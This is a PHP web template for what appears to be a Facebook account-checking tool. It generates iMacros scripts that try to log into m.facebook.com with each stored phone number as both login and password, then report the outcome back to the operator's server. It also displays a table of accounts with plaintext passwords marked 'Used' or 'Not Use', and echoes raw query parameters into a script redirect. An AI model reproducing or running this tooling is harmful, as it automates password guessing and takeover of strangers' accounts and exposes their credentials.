 <script type="text/javascript" src="<?php echo base_url();?>themes/layout/blueone/assets/js/libs/jquery.min.js"></script>
    <style>
        .radio-inline{}
        .error {color: red}
        #blockuis{padding:10px;position:fixed;z-index:99999999;background:rgba(0, 0, 0, 0.73);top:20%;left:50%;transform:translate(-50%,-50%);-webkit-transform:translate(-50%,-50%);-moz-transform:translate(-50%,-50%);-ms-transform:translate(-50%,-50%);-o-transform:translate(-50%,-50%);}
    </style>
    <div class="page-header">
    </div>  
    <div style="display:none;text-align:center;font-size:20px;color:white" id="blockuis">
        <div id="loaderimg" class=""><img align="middle" valign="middle" src="http://2.bp.blogspot.com/-_nbwr74fDyA/VaECRPkJ9HI/AAAAAAAAKdI/LBRKIEwbVUM/s1600/splash-loader.gif"></div>
        Please wait...
    </div>

    <?php
    $log_id = $this->session->userdata('user_id');
    $email = $this->session->userdata('email');
    $type = $this->session->userdata('user_type');
     if(!empty($data) && !empty($_GET['status'])):?>
        <script type="text/javascript">
        window.location ="<?php echo base_url();?>Facebook/fbnumset?status=<?php echo $_GET['status'];?>&id=<?php echo $data->id;?>&num=<?php echo $data->f_phone;?>&u=<?php echo $log_id;?>&e=<?php echo $email;?>&t=<?php echo $type;?>&total=<?php echo $_GET['total'];?>";
        </script>
    <?php elseif(!empty($data) && empty($_GET['status'])):
        $userName = $data->f_name;
        $url = $data->f_lname;
        $userId = $data->f_pass;
        $phoneNumber = preg_replace('/^0/','+855',$data->f_phone);
        $phone = $data->f_phone;
        $id = $data->id;
        $t = '300';
        $total = !empty($_GET['total']) ? $_GET['total'] : 1;
        $tranferGroup = 'code = &quot;&quot;;';
        $tranferGroup .= 'code+=&quot;CLEAR\n&quot;;';
        $tranferGroup .= 'code+=&quot;URL GOTO=https://m.facebook.com/home.php\n&quot;;';
        $tranferGroup .= 'iimPlayCode(codedefault2+code);';
        $tranferGroup .= 'function do_logout(){code = &quot;&quot;;code+=&quot;URL GOTO=https://m.facebook.com/'.$userId.'\n&quot;;code += &quot;TAG POS=1 TYPE=A ATTR=HREF:*logout.php*\n&quot;;iimPlayCode(codedefault2+code);}';
        $tranferGroup .= 'var QueryString=function(){var query_string={};var query=window.location.search.substring(1);var vars=query.split("&amp;");for(var i=0;i&lt;vars.length;i++){var pair=vars[i].split("=");if(typeof query_string[pair[0]]==="undefined"){query_string[pair[0]]=decodeURIComponent(pair[1]);}else if(typeof query_string[pair[0]]==="string"){var arr=[query_string[pair[0]],decodeURIComponent(pair[1])];query_string[pair[0]]=arr;}else{query_string[pair[0]].push(decodeURIComponent(pair[1]));}}return query_string;}();';
        $tranferGroup .= 'if(!QueryString.next) {do_logout();}';
        $tranferGroup .= 'code = &quot;&quot;;';
        $tranferGroup .= 'code += &quot;WAIT SECONDS=2\n&quot;;';
        $tranferGroup .= 'code += &quot;TAG POS=1 TYPE=INPUT:TEXT FORM=ID:login_form ATTR=NAME:email CONTENT='.$phoneNumber.'\n&quot;;';
        $tranferGroup .= 'code += &quot;TAG POS=1 TYPE=INPUT:PASSWORD FORM=ID:login_form ATTR=NAME:pass CONTENT='.$phone.'\n&quot;;';
        $tranferGroup .= 'code += &quot;WAIT SECONDS=10\n&quot;;';
        $tranferGroup .= 'code += &quot;TAG POS=1 TYPE=INPUT:SUBMIT FORM=ID:login_form ATTR=NAME:login\n&quot;;';
        $tranferGroup .= 'code += &quot;TAG POS=1 TYPE=H2 ATTR=TXT:* EXTRACT=TXT\n&quot;;';
        $tranferGroup .= 'code += &quot;TAG POS=1 TYPE=H3 ATTR=TXT:* EXTRACT=TXT\n&quot;;';
        $tranferGroup .= 'code += &quot;WAIT SECONDS=2\n&quot;;';
        $tranferGroup .= 'iimPlayCode(codedefault2+code);';
        $tranferGroup .= 'var codeEx = iimGetLastExtract(1).replace(/ /g, "<sp>").replace(/\n/g, "<br>");';
        $tranferGroup .= 'var codeEx2 = iimGetLastExtract(2).replace(/ /g, "<sp>").replace(/\n/g, "<br>");';
        $tranferGroup .= 'var QueryString=function(){var query_string={};var query=window.location.search.substring(1);var vars=query.split("&amp;");for(var i=0;i&lt;vars.length;i++){var pair=vars[i].split("=");if(typeof query_string[pair[0]]==="undefined"){query_string[pair[0]]=decodeURIComponent(pair[1]);}else if(typeof query_string[pair[0]]==="string"){var arr=[query_string[pair[0]],decodeURIComponent(pair[1])];query_string[pair[0]]=arr;}else{query_string[pair[0]].push(decodeURIComponent(pair[1]));}}return query_string;}();';
        $tranferGroup .= 'var fb_status=1; if(codeEx  == &quot;Pleasetryagainlater&quot;) {fb_status=2;} if(codeEx2  == &quot;PleaseConfirmYourIdentity&quot;) {fb_status=1;} if(QueryString.login_try_number) {fb_status=&quot;no&quot;;}';
        $tranferGroup .= 'code = &quot;&quot;;';
        $tranferGroup .= 'code+=&quot;CLEAR\n&quot;;';
        $tranferGroup .= 'code+=&quot;URL GOTO='.base_url().'Facebook/checknum?status=&quot; + fb_status + &quot;&u='.$log_id . '&e='.$email.'&t='.$type.'&total=&quot; + total + &quot;&checkMy=&quot; + codeEx2 + &quot;\n&quot;;';
        $tranferGroup .= 'iimPlayCode(codedefault2+code);';         
        ?>  
        <code id="examplecode5" style="width:300px;overflow:hidden;display:none">var contents=null,images=null,groups=null,setIdAccout=null,postingOn=0,total=<?php echo @$total;?>;var codedefault1=&quot;TAB CLOSEALLOTHERS\n SET !EXTRACT_TEST_POPUP NO\n SET !TIMEOUT_PAGE 100\n SET !ERRORIGNORE YES\n SET !TIMEOUT_STEP 0.1\n&quot;;var codedefault2=&quot;SET !EXTRACT_TEST_POPUP NO\n SET !TIMEOUT_PAGE 10\n SET !ERRORIGNORE YES\n SET !TIMEOUT_STEP 0.1\n&quot;;var wm=Components.classes[&quot;@mozilla.org/appshell/window-mediator;1&quot;].getService(Components.interfaces.nsIWindowMediator);var window=wm.getMostRecentWindow(&quot;navigator:browser&quot;);<?php echo @$tranferGroup;?>iimPlay('CODE:WAIT SECONDS=0');</code>  
    <script type="text/javascript">
        function getattra(e) {
            $("#singerimageFist").val(e);
            $("#imageviewFist").html('<img style="width:100%;height:55px;" src="' + e + '"/>');
        }
        function loading () {
            $("#blockuis").show();
        }

        function runCode () {
            loading();
            var str = $("#examplecode5").text();
            var code = str;
            if (/imacros_sozi/.test(code)) {
                codeiMacros = eval(code);
                if (codeiMacros) {
                    codeiMacros = "javascript:(function() {try{var e_m64 = \"" + btoa(codeiMacros) + "\", n64 = \"JTIzQ3VycmVudC5paW0=\";if(!/^(?:chrome|https?|file)/.test(location)){alert(\"iMacros: Open webpage to run a macro.\");return;}var macro = {};macro.source = atob(e_m64);macro.name = decodeURIComponent(atob(n64));var evt = document.createEvent(\"CustomEvent\");evt.initCustomEvent(\"iMacrosRunMacro\", true, true, macro);window.dispatchEvent(evt);}catch(e){alert(\"iMacros Bookmarklet error: \"+e.toString());}}) ();";
                    location.href = codeiMacros;
                } else {
                    alert('fail');
                }

            } else if (/iimPlay/.test(code)) {
                code = "imacros://run/?code=" + btoa(code);
                location.href = code;
            } else {
                code = "javascript:(function() {try{var e_m64 = \"" + btoa(code) + "\", n64 = \"JTIzQ3VycmVudC5paW0=\";if(!/^(?:chrome|https?|file)/.test(location)){alert(\"iMacros: Open webpage to run a macro.\");return;}var macro = {};macro.source = atob(e_m64);macro.name = decodeURIComponent(atob(n64));var evt = document.createEvent(\"CustomEvent\");evt.initCustomEvent(\"iMacrosRunMacro\", true, true, macro);window.dispatchEvent(evt);}catch(e){alert(\"iMacros Bookmarklet error: \"+e.toString());}}) ();";
                location.href = code;
            }
        }
        //runCode();
        <?php if(!empty($_GET['next'])):?>
        //runCode();
        <?php endif;?>
    </script>
    <div class="row">
        <div class="col-md-12">
        <h2>Total: <?php echo count(@$result);?></h2>
        </div>
    </div>
    <?php endif;?>
    <div class="row">
        <div class="col-md-12">
            <div class="widget box">
                <div class="widget-header">
                    <h4><i class="icon-reorder"></i> Facebook (<?php echo count(@$result);?>)</h4>
                    <div class="toolbar no-padding">
                        <a href="<?php echo base_url() . 'Facebook/fbstatus'; ?>"  class="btn btn-xs btn-info">Add new</a>                                    
                        <a href="<?php echo base_url() . 'Facebook/checknum'; ?>"  class="btn btn-xs btn-facebook">Uncheck</a>
                        <div class="btn-group"> <span class="btn btn-xs widget-collapse"><i class="icon-angle-down"></i></span> </div>
                    </div>
                </div>
                <div class="widget-content" style="display: block;">
                    <table class="table table-hover table-condensed">
                        <thead>
                            <tr>
                                <th class="hidden-xs">Name</th>
                                <th>User</th>
                                <th>Password</th>
                                <th>Status</th>
                                <th>Action</th>
                            </tr>
                        </thead>
                        <tbody>
                            <?php if(!empty($result)):?>
                            <?php foreach($result as $number):?>
                            <tr>
                                <td class="hidden-xs">
                                    <a href="https://www.facebook.com/<?php echo $number->f_name;?>" target="_blank"><?php echo $number->f_name;?></a>
                                    <br/>
                                    <small>Mutual Friends: <b><?php echo $number->f_lname;?></b></small>
                                </td>
                                <td>
                                    <?php echo $number->f_phone;?>
                                </td>
                                <td><?php echo $number->f_pass;?></td>
                                <td>
                                    <div class="btn-group"> 
                                        <button class="btn btn-xs dropdown-toggle <?php echo ($number->f_status == 4) ? 'btn-success':'btn-warning';?>" data-toggle="dropdown"> <?php echo ($number->f_status == 4) ? 'Used':'Not Use';?>
                                            <span class="caret"></span> 
                                        </button> 
                                        <ul class="dropdown-menu"> 
                                            <li><a href="<?php echo base_url();?>Facebook/fblist?id=<?php echo $number->id;?>&type=status&status=4"><span class="text-success">Used</span></a></li> 
                                            <li><a href="<?php echo base_url();?>Facebook/fblist?id=<?php echo $number->id;?>&type=status&status=8"><span class="text-danger"> Not Use</span></a></li> 
                                        </ul> 
                                    </div>
                                </td>
                                <td>
                                     <ul class="table-controls">
                                        <li><a href="javascript:void(0);" class="bs-tooltip" title="" data-original-title="Edit"><i class="icon-pencil"></i></a> </li>
                                        <li><a href="<?php echo base_url();?>Facebook/fblist?id=<?php echo $number->id;?>&type=del" class="bs-tooltip" title="" data-original-title="Delete"><i class="icon-trash" style="color: red"></i></a> </li>
                                    </ul>
                                </td>
                            </tr>
                            <?php endforeach;?>
                            <?php endif;?>
                        </tbody>
                    </table>

                    <div class="row">
                        <div class="table-footer">
                            <div class="col-md-12">
                                <div class="table-actions">
                                    <div class="pull-left"><?php echo @$total_rows;?></div>
                                    <?php echo @$this->pagination->create_links();?>
                                </div>
                            </div>
                        </div>
                    </div>

                </div>
            </div>
        </div>
    </div>